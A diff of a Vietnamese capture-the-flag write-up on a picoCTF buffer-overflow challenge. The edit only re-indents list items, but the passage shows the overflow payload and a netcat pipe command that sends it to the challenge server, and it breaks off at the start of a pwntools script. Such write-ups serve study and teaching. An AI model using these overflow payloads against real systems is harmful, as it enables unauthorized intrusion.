@@ -91,9 +91,9 @@ Vì câu lệnh gets có địa chỉ là 0x401275 nên ta đặt breakpoint t�
 ## 3. Tiến hành khai thác
 
 - Cách 1: truyền bằng pipe:
-+ Payload:
+  + Payload:
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7\x41 (41 trong hex = 65 trong decimal)
-+ Câu lệnh truyền payload bằng pipe:
+  + Câu lệnh truyền payload bằng pipe:
 
 ```cpp
 (echo -ne "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7\x41"; cat) | nc saturn.picoctf.net 65514
@@ -102,7 +102,7 @@ Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7\x41 (41 trong hex = 65 trong decimal)
 ![image.png](image%205.png)
 
 - Cách 2: dùng file thực thi
-+ Ta tạo file python thực thi:
+  + Ta tạo file python thực thi:
 
 ```cpp
 from pwn import *
